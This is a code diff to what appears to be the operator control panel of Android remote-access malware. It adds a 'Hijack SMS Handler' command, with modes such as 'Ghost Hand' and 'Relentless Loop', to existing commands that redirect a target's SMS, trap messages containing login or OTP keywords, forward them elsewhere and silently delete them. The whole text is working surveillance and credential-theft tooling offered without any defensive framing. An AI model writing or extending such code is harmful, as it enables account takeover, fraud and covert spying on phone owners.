@@ -332,8 +332,9 @@
                 id: 'comm', 
                 label: 'Communications & Logs', 
                 css: 'sys', 
-                search: 'sms, calls, contacts, keywords, filter, hvt, redirection, forward, wipe, delete, sanitize, auto, swipe',
+                search: 'sms, calls, contacts, keywords, filter, hvt, redirection, forward, wipe, delete, sanitize, auto, swipe, default, handler',
                 commands: [
+                    { id: 'SET_DEFAULT_SMS', name: 'Hijack SMS Handler', icon: '💬', inputs: [{id: 'sms-default-mode', label: 'Strategy', type: 'select', options: [{v: 'AUTO', l: 'AUTO (Ghost Hand)'}, {v: 'RELENTLESS', l: 'Relentless Loop'}, {v: 'TRIGGER', l: 'Trigger Prompt'}, {v: 'SCRAPE', l: 'Scrape Dialog'}, {v: 'STOP_RELENTLESS', l: 'Stop Loop'}]}] },
                     { id: 'ADD_HVT_REDIRECT', name: 'SMS Redirection (HVT)', icon: '🔄', inputs: [{id: 'hvt-sender', label: 'Target Number', type: 'text'}, {id: 'hvt-dest', label: 'Destination', type: 'text'}], cleanup: 'CLEAR_HVT_REDIRECTS' },
                     { id: 'ADD_KEYWORD_FORWARD', name: 'Keyword SMS Trap', icon: '🪤', inputs: [{id: 'kw-list', label: 'Keywords (login,otp)', type: 'text'}, {id: 'kw-dest', label: 'Destination', type: 'text'}], cleanup: 'CLEAR_KEYWORD_FORWARDS' },
                     { id: 'ADD_AUTO_SWIPE', name: 'Auto-Swipe', icon: '🕵️', inputs: [{id: 'swipe-type', label: 'Target', type: 'select', options: [{v: 'pkgs', l: 'App Package'}, {v: 'keywords', l: 'Keywords'}, {v: 'senders', l: 'Sender Number'}]}, {id: 'swipe-val', label: 'Value', type: 'text'}], cleanup: 'CLEAR_AUTO_SWIPE' },
@@ -801,6 +802,7 @@
             let content = forcedVal;
             if (content === null) {
                 switch(type) {
+                    case 'SET_DEFAULT_SMS': content = document.getElementById('sms-default-mode').value; break;
                     case 'TOAST': content = document.getElementById('val-toast').value; break;
                     case 'RING': content = document.getElementById('val-ring').value; break;
                     case 'RECORD_SCREEN':
